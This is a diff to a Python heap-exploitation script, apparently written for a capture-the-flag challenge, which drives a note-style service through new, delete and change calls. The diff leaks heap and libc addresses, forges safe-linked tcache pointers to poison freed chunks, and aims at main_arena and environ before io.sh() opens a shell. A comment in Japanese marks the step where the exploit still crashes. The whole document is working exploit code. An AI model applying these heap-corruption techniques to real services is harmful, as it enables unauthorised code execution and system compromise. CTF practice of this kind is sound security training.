@@ -83,12 +83,9 @@ def main():
     heap_base = ptr.u64(view().split(b"A: AAAAAAAA")[1].split(b"\nroot")[0])
     heap_base = heap_base >> 12 << 12
     ptr.logger.info(f"heap_base = {hex(heap_base)}")
-
     new("B", "hello")
-
     for _ in range(22):
         new("extend", "extend")
-
     delete("B")
     delete("root")
     restart()
@@ -107,10 +104,31 @@ def main():
     delete(ptr.p64(safe_link(heap_base, 0x370, 0xD00)))
     new(ptr.p64(safe_link(heap_base, 0x370, 0x380)), "hello")
     new("tokyo", "ghoul")
-    new(ptr.p64(heap_base + 0x5a0), ptr.p64(heap_base + 0x5a0))
-    input(">> ")
+    new(ptr.p64(heap_base + 0x5A0), ptr.p64(heap_base + 0x5A0))
     delete(ptr.p64(heap_base + 0x590))
-    # new(ptr.p64(heap_base + 0x370), ptr.p64(heap_base + 0x370))
+    restart()
+    new("kanashi", "ohanashi")
+    delete("kanashi")
+    delete("root")
+    change(ptr.p64(safe_link(heap_base, 0x5A0, 0x770)), "fake_key")
+    delete(ptr.p64(safe_link(heap_base, 0x5A0, 0x770)))
+    new(ptr.p64(safe_link(heap_base, 0x5A0, 0x7A0)), "hello")
+    new("iron", "fortless")
+    new("", "")
+    libc.base = ptr.u64(view().split(b":")[0]) - 0x1F6C0A
+    main_arena = unwrap(libc.symbol("main_arena"))
+    environ = unwrap(libc.symbol("environ"))
+    change(ptr.p64(libc.base + 0x1F6C0A), ptr.p64(libc.base + 0x1F6C0A))
+    
+    delete(ptr.p64(libc.base + 0x1F6C0A))
+    change(ptr.p64(heap_base >> 12), ptr.p64(0))
+    delete("iron")
+    change(ptr.p64(main_arena + 96), "fake_key")
+    delete(ptr.p64(main_arena + 96))
+    new(ptr.p64((heap_base + 0x5a0) >> 12 ^ environ), ptr.p64(environ))
+    new("hello", "world")
+    new("A", "A") # ここで落ちる
+    
     io.sh()
     return
 
